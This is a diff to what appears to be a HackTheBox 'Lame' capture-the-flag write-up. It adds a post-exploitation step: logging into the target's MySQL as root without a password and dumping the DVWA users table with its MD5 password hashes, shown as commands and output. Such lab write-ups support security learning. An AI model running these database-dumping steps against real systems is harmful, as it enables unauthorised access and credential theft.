@@ -640,6 +640,71 @@ root
 
 ### Post Exploitation
 
+#### MySQL data dump
+
+We can login to MySQL running on localhost of the target without using a password.
+
+```
+daemon@lame:/tmp$ mysql -u root
+mysql -u root
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 13
+Server version: 5.0.51a-3ubuntu5 (Ubuntu)
+
+Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
+
+mysql> 
+```
+
+The loot gathered is as follows:
+
+```
+mysql> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema | 
+| dvwa               | 
+| metasploit         | 
+| mysql              | 
+| owasp10            | 
+| tikiwiki           | 
+| tikiwiki195        | 
++--------------------+
+7 rows in set (0.00 sec)
+
+mysql> use dvwa;
+use dvwa;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
+show tables;
++----------------+
+| Tables_in_dvwa |
++----------------+
+| guestbook      | 
+| users          | 
++----------------+
+2 rows in set (0.00 sec)
+
+mysql> select * from users;
+select * from users;
++---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
+| user_id | first_name | last_name | user    | password                         | avatar                                                |
++---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
+|       1 | admin      | admin     | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 | http://172.16.123.129/dvwa/hackable/users/admin.jpg   | 
+|       2 | Gordon     | Brown     | gordonb | e99a18c428cb38d5f260853678922e03 | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg | 
+|       3 | Hack       | Me        | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b | http://172.16.123.129/dvwa/hackable/users/1337.jpg    | 
+|       4 | Pablo      | Picasso   | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 | http://172.16.123.129/dvwa/hackable/users/pablo.jpg   | 
+|       5 | Bob        | Smith     | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 | http://172.16.123.129/dvwa/hackable/users/smithy.jpg  | 
++---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
+5 rows in set (0.00 sec)
+
+```
+
 #### Cracking passwords from passwd and shadow files
 
 Once we gain privileged access either via the SMB exploit or via nmap, we can dump out the shadow files and passwd files for the target.
